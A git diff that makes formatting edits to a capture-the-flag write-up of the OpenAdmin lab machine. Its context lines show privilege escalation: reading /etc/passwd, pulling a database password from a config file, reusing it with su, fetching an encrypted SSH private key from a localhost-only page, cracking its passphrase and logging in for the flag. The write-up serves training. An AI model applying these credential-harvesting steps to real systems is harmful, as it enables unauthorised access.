@@ -230,7 +230,7 @@ Furhter we have to privilege escalate to jimmy, to get access to the internal di
 
 Let's check who else have an account on this box.
 
-```bash
+```console
 www-data@openadmin:/var/www$ cat /etc/passwd
 cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
@@ -277,7 +277,7 @@ User: joanna
 Now we check out what we find inside the ona directory we can access and have a
 closer look to the `database_settings.inc.php` file.
 
-```bash
+```php
 www-data@openadmin:/var/www/html/ona/local/config$  ls
 database_settings.inc.php  motd.txt.example  run_installer
 www-data@openadmin:/var/www/html/ona/local/config$ cat database_settings.inc.php
@@ -315,7 +315,7 @@ Password: n1nj4W4rri0R!
 
 Let's see if the password got reused by any of the known accounts.
 
-```bash
+```console
 www-data@openadmin:/var/www/html/ona/local/config$ su - jimmy
 Password: 
 jimmy@openadmin:~$
@@ -327,7 +327,7 @@ internal directory.
 In the `main.php` file we get a hint that the file runs on an webserver and
 is able to cat out the ssh private key of joanna.
 
-```bash
+```console
 jimmy@openadmin:/var/www/internal$ cat main.php 
 <?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
 # Open Admin Trusted
@@ -344,7 +344,7 @@ Click here to logout <a href="logout.php" tite = "Logout">Session
 In our nmap we couldn't find any other port or webserver so let's see if there is something
 listening on `127.0.0.1` aka the localhost.
 
-```bash
+```console
 jimmy@openadmin:~$ ss -tulpn
 Netid  State    Recv-Q   Send-Q      Local Address:Port      Peer Address:Port
 udp    UNCONN   0        0           127.0.0.53%lo:53             0.0.0.0:*
@@ -359,7 +359,7 @@ tcp    LISTEN   0        128                  [::]:22                [::]:*
 The interesting port here is the high port `52846` which we immediately throw a curl at
 to see if we can get the private key.
 
-```bash
+```console
 jimmy@openadmin:/var/www$ curl 127.0.0.1:52846/main.php
 <pre>-----BEGIN RSA PRIVATE KEY-----
 Proc-Type: 4,ENCRYPTED
@@ -427,7 +427,7 @@ Awesome! We get the password.
 Password: bloodninjas
 ```
 
-change the file permission on the key - like always.
+Change the file permission on the key - like always.
 
 ```console
 $ chmod 600 joanna_id_rsa
@@ -436,7 +436,7 @@ $ chmod 600 joanna_id_rsa
 And login as joanna to grab the user flag.
 
 ```console
-$ kali@kali:~/Downloads$ ssh -i joanna_id_rsa joanna@10.10.10.171
+$ ssh -i joanna_id_rsa joanna@10.10.10.171
 load pubkey "joanna_id_rsa": invalid format
 Enter passphrase for key 'joanna_id_rsa': 
 Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)
@@ -465,12 +465,14 @@ Last login: Thu Jan  2 21:12:40 2020 from 10.10.14.3
 ```
 
 
-## user.txt
+# user.txt
 
 ```console
 joanna@openadmin:~$ cat user.txt
 c9b2cf07d40807e62af62660f0c81b5f
 ```
+
+# The way to root
 
 
 
